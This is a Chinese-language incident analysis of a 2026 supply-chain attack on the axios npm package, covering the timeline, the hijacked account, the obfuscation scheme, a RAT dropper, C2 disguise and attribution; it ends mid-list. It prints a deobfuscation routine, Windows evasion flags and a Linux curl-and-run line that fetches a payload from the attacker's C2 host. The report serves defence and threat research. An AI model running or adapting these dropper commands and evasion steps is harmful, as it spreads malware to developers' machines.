---
title: Axios npm 供应链攻击深度分析报告
url: https://mp.weixin.qq.com/s/8J95hWsvAaLNPBbSQAqpeg
source: Doonsec's feed
date: 2026-03-31
fetch_date: 2026-04-01T04:43:28.164941
---

# Axios npm 供应链攻击深度分析报告

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/3ZT9RTibiaglY6iaLHicZqtv4WI3mv2VPh287UGO4ibt6ib1KvPyzyzBADqic8rGY5jtcOGMcVTCKic6REtwDDWbajjLAkNmJ97frNgqE0yT3Zc4lJ0/0?wx_fmt=jpeg)

# Axios npm 供应链攻击深度分析报告

马甲三号

![]()

在小说阅读器中沉浸阅读

# Axios npm 供应链攻击深度分析报告

**事件日期**: 2026年3月30日 – 3月31日
**分析日期**: 2026年3月31日
**跟踪编号**: MSC-2026-3522 / GHSA-fw8c-xr5c-95f9 / MAL-2026-2306

---

## 一、事件概述

2026年3月30日至31日，攻击者通过劫持 axios 主维护者 `jasonsaayman` 的 npm 账户，发布了两个恶意版本 —— `axios@1.14.1` 和 `axios@0.30.4`。axios 是 JavaScript 生态系统中最流行的 HTTP 客户端库，**每周下载量超过 1 亿次，存在于约 80% 的云与代码环境中**。

恶意版本注入了一个虚假依赖 `plain-crypto-js@4.2.1`，该包的唯一目的是通过 `postinstall` 钩子执行一个跨平台远程访问木马（RAT）投递器，目标覆盖 macOS、Windows 和 Linux。

**恶意包在线暴露窗口约 2 小时 53 分钟**，但鉴于 axios 的全球下载速度，Wiz 观测到 **3% 的受影响环境已执行了恶意代码**。

---

## 二、攻击时间线

| 时间 (UTC) | 事件 |
| --- | --- |
| 3月30日 05:57 | `plain-crypto-js@4.2.0` 发布（清洁诱饵版本），发布者 `nrwise@proton.me`，用于建立发布历史 |
| 3月30日 23:59 | `plain-crypto-js@4.2.1` 发布（武器化版本），注入 `postinstall` 钩子和混淆投递器 |
| 3月31日 00:21 | `axios@1.14.1` 通过被劫持的 `jasonsaayman` 账户发布（账户邮箱已被改为 `ifstap@proton.me`） |
| 3月31日 01:00 | `axios@0.30.4` 发布，39 分钟内同时毒化 1.x 和 0.x 两个发行分支 |
| 3月31日 ~03:15 | npm 安全团队撤回两个恶意 axios 版本 |
| 3月31日 03:25 | npm 对 `plain-crypto-js` 发起安全冻结 |
| 3月31日 04:26 | npm 发布安全占位包 `plain-crypto-js@0.0.1-security.0` |

**关键观察**：诱饵版本比武器化版本提前 **18 小时**发布，这是一种精心设计的 OPSEC 手段，旨在让 `nrwise` 账户看起来像一个有发布历史的合法维护者，从而绕过安全扫描器对"零历史账户"的告警。

---

## 三、技术分析

### 3.1 初始入侵：npm 账户劫持

攻击者获取了 `jasonsaayman` 账户的**长期经典 npm 访问令牌（classic npm access token）**，而非短暂的 OIDC 令牌。证据链：

* • 合法的 axios 发布使用 **GitHub Actions + npm OIDC Trusted Publisher** 机制，发布记录中包含 `trustedPublisher` 和 `gitHead` 字段
* • `axios@1.14.1` 的 npm 元数据**没有 OIDC 绑定、没有 gitHead、没有对应的 GitHub commit 或 tag**
* • 账户邮箱被改为攻击者控制的 `ifstap@proton.me`（ProtonMail 匿名地址）
* • 攻击期间，攻击者可能保留了部分账户访问权限——有报告指出，社区成员提交的安全问题（#10604）被创建后不久即被删除

**npm 元数据对比：**

```
// axios@1.14.0 — 合法发布
"_npmUser":{
"name":"GitHub Actions",
"email":"npm-oidc-no-reply@github.com",
"trustedPublisher":{
    "id":"github",
    "oidcConfigId":"oidc:9061ef30-3132-49f4-b28c-9338d192a1a9"
}
}

// axios@1.14.1 — 恶意发布
"_npmUser":{
"name":"jasonsaayman",
"email":"ifstap@proton.me"
// 无 trustedPublisher, 无 gitHead, 无对应 GitHub commit
}
```

### 3.2 恶意依赖预部署

攻击者从 `nrwise@proton.me` 账户预先部署了 `plain-crypto-js`：

* • **v4.2.0（诱饵）**：合法 `crypto-js` 的完整克隆，53 个加密原语文件，无 `postinstall` 钩子，无恶意代码——纯粹用于建立发布信誉
* • **v4.2.1（武器化）**：仅增加了 3 个变更：

| 文件 | v4.2.0 | v4.2.1 | 变更 |
| --- | --- | --- | --- |
| `package.json` | 无 `scripts` 段 | 添加 `"postinstall": "node setup.js"` | 武器注入 |
| `setup.js` | 不存在 | 4.2 KB 混淆投递器 | RAT 投递器 |
| `package.md` | 不存在 | 清洁 JSON 存根（版本号 `4.2.0`） | 反取证替换文件 |

### 3.3 投递器（Stage 1）—— `setup.js` 详解

`setup.js` 是一个 **4,209 字节的高度混淆 JavaScript 投递器**，通过 `postinstall` 钩子在 `npm install` 时自动执行。

#### 混淆方案（双层编码）

* • **第一层**：字符串反转 → 下划线替换为 `=` padding → Base64 解码
* • **第二层**：每个解码字符与密钥 `OrDeR_7077` 中的数字（索引选择公式：`7*i*i % 10`）和常数 `333` 进行 XOR 运算

```
// 反混淆函数（重构）
const _trans_1 = function(x, r) {
const E = r.split("").map(Number);
return x.split("").map((x, r) => {
    const S = x.charCodeAt(0), a = E[7 * r * r % 10];
    returnString.fromCharCode(S ^ a ^ 333);
  }).join("");
};

const trans_2 = function(x, r) {
let E = x.split("").reverse().join("").replaceAll("_", "=");
let S = Buffer.from(E, "base64").toString("utf8");
return_trans_1(S, r);
};

const ord = "OrDeR_7077";
```

#### 解码后的 18 个 `stq[]` 字符串

| 索引 | 类别 | 解码值 |
| --- | --- | --- |
| stq[0] | Node.js 模块 | `child_process` |
| stq[1] | Node.js 模块 | `os` |
| stq[2] | Node.js 模块 | `fs` |
| stq[3] | C2 基础 URL | `http://sfrclak[.]com:8000/` |
| stq[5] | 平台标识 | `win32` |
| stq[6] | 平台标识 | `darwin` |
| stq[7] | Windows 投递器 | VBScript 投递器模板 |
| stq[8] | Windows 启动器 | `cscript` 启动命令 |
| stq[9] | macOS 投递器 | AppleScript 投递器模板 |
| stq[10] | macOS 启动器 | `nohup osascript` 启动命令 |
| stq[12] | Linux 投递器 | `curl -o /tmp/ld.py` |
| stq[13] | 反取证 | `package.json` （删除目标） |
| stq[14] | 反取证 | `package.md` （清洁替换文件） |
| stq[15]-[17] | 文件扩展名 | `.exe` , `.ps1`, `.vbs` |

#### 执行流程

```
npm install
  → postinstall hook
    → node setup.js
      → _entry("6202033")
        → os.platform() 检测操作系统
          → darwin:  AppleScript → curl C2 → /Library/Caches/com.apple.act.mond
          → win32:   VBScript → PowerShell copy → curl C2 → .ps1 执行
          → linux:   curl C2 → /tmp/ld.py → python3 执行
      → 删除 setup.js
      → 删除 package.json
      → 重命名 package.md → package.json（清除所有证据）
```

### 3.4 平台特定载荷投递（Stage 1.5）

#### macOS（darwin）

1. 1. 写入 AppleScript 到 `/tmp/6202033`
2. 2. 通过 `curl` POST 请求从 C2 下载二进制文件

* • POST body: `packages.npm.org/product0`（伪装成 npm 注册表流量）
* • C2 URL: `http://sfrclak[.]com:8000/6202033`

3. 3. 保存到 `/Library/Caches/com.apple.act.mond`（**故意模仿 Apple 的 `com.apple.*` 命名约定**）
4. 4. `chmod 770` 设置可执行权限
5. 5. 通过 `/bin/zsh` 在后台执行，C2 URL 作为参数传递
6. 6. 删除 AppleScript 加载器
7. 7. 通过 `nohup osascript` 分离启动，`npm install` 进程立即返回

#### Windows（win32）

1. 1. `where powershell` 定位 PowerShell 二进制文件
2. 2. **将 `powershell.exe` 复制为 `%PROGRAMDATA%\wt.exe`**（伪装成 Windows Terminal，已知 EDR 绕过技术）
3. 3. 写入 VBScript 到 `%TEMP%\6202033.vbs`

* • 使用 `WScript.Shell` 启动隐藏的 `cmd.exe` 窗口（`window style 0`）

4. 4. curl 下载 PowerShell 脚本（POST body: `packages.npm.org/product1`）
5. 5. 保存为 `%TEMP%\6202033.ps1`
6. 6. 使用复制后的 PowerShell（`wt.exe`）执行：`-w hidden -ep bypass`

* • `-w hidden`：隐藏窗口
* • `-ep bypass`：绕过执行策略

7. 7. 执行后删除 `.vbs` 和 `.ps1` 文件

#### Linux

最简路径：

```
curl -d "packages.npm.org/product2" -o /tmp/ld.py http://sfrclak[.]com:8000/6202033
nohup python3 /tmp/ld.py &
```

### 3.5 C2 通信伪装设计

POST 请求体 `packages.npm.org/product{0,1,2}` 是**精心设计的伪装**：

* • `npm.org` 并非 npm 注册表（真实域名为 `registry.npmjs.org`），它实际属于"美国全国牧师音乐家协会"（National Association of Pastoral Musicians），自 1997 年起持有该域名
* • 网络监控工具和 SIEM 规则在记录 HTTP 请求体时，会将其误认为正常的 npm 注册表流量
* • `/product` 后缀数字让 C2 服务器可以根据平台路由到正确的载荷
* • 活动 ID `6202033` 是唯一硬编码在混淆数组外部的值，允许基础设施在未来活动中被重复使用

### 3.6 第二阶段载荷（Stage 2）—— 全功能 RAT

三个平台的 RAT 变体均以 **60 秒间隔**向 C2 服务器发送信标，传输系统清单并等待命令。

| 平台 | 载荷类型 | 关键能力 |
| --- | --- | --- |
| **macOS** | C++ 编译的 Mach-O universal 二进制文件 | 远程 shell 执行、二进制注入、目录浏览、进程列表、系统侦察、**通过 `codesign` 自签名注入的载荷** |
| **Windows** | PowerShell 脚本 | 远程 shell 执行、**通过注册表 Run 键（`MicrosoftUpdate`）建立持久化**、重新下载批处理文件 |
| **Linux** | Python 脚本 | 远程 shell 执行、系统侦察、文件访问 |

**值得注意的差异：**

* • macOS 和 Linux 变体**未建立持久化**，暗示其设计用于快速数据窃取或后续攻击
* • Windows 变体**建立了注册表持久化**（`MicrosoftUpdate` Run key），具有更强的驻留能力

### 3.7 自毁与反取证机制

投递器在启动平台载荷后执行三步清理序列：

1. 1. **删除** `setup.js`（投递器本体）
2. 2. **删除** `package.json`（包含 postinstall 钩子的版本）
3. 3. **重命名** `package.md` → `package.json`（预置的清洁版本，不含任何钩子，版本号显示为 `4.2.0`）

**结果**：`node_modules/plain-crypto-js/` 目录中**不留任何入侵痕迹**。事后审计该目录只会看到一个完全正常的包——没有投递器、没有 postinstall 钩子、没有意外文件。

---

## 四、攻击来源与归因分析

### 4.1 当前归因状态

截至 2026 年 3 月 31 日，**尚无公开的确定性归因**。多家安全厂商的立场：

| 机构 | 立场 |
| --- | --- |
| **Socket Research** | 明确表示"**未观察到任何证据**将此活动与 TeamPCP 活动关联" |
| **SOCRadar** | 评估为"与经济动机威胁行为者或**国家级关联组织**一致的操作复杂度" |
| **Wiz** | 在"相关阅读"中引用 TeamPCP 追踪文章，但**未建立直接关联** |
| **StepSecurity** | 描述为"最具操作复杂性的供应链攻击之一"，**未做归因** |

### 4.2 TeamPCP 关联性评估

**TeamPCP**（又名 DeadCatx3、PCPcat、ShellForce、PersyPCP）是 2025 年 12 月以来最活跃的供应链攻击组织。其 2026 年 3 月的活动时间线：

| 日期 | TeamPCP 活动 |
| --- | --- |
| 3月19日 | 劫持 Trivy 漏洞扫描器（CVE-2026-33634），76/77 版本标签被重写 |
| 3月20-22日 | 部署 CanisterWorm npm 蠕虫，150+ 包被感染，使用 ICP 链上 C2 |
| 3月22日 | 添加针对伊朗的地缘政治定向擦除器（kamikaze.sh） |
| 3月23日 | 劫持 Checkmarx KICS GitHub Actions，C2 为 `checkmarx[.]zone` |
| 3月24日 | 劫持 LiteLLM（PyPI，360 万日下载量），C2 为 `models.litellm.cloud` |
| **3月30-31日** | **axios 攻击** （是否为 TeamPCP？存疑） |

#### 支持关联的证据

* • 时间窗口高度重合（axios 攻击发生在 TeamPCP 活动高峰的延长线上）
* • 相同的宏观攻击模式：账户劫持 → 注入恶意依赖 → 凭证/系统窃取
* • TeamPCP 在前期攻击中收获了**海量 npm 令牌**（CanisterWorm 从 78% 的感染环境中成功窃取了认证令牌），理论上可用于劫持 axios 维护者账户
* • Wiz 的 IOC 附录中同时列出了 `@shadanai/openclaw` 和 `@qqbrowser/openclaw-qbot` 等包，暗示可能存在关联活动生态

#### 反对关联的证据

* • **C2 基础设施完全不同**：

+ • axios: `sfrclak[.]com:8000`（IP: `142.11.206.73`）
+ • TeamPCP: Cloudflare Tunnels、ICP 链上金丝雀、`scan.aquasecurtiy[.]org`、`checkmarx[.]zone`、`models.litellm.cloud`

* ...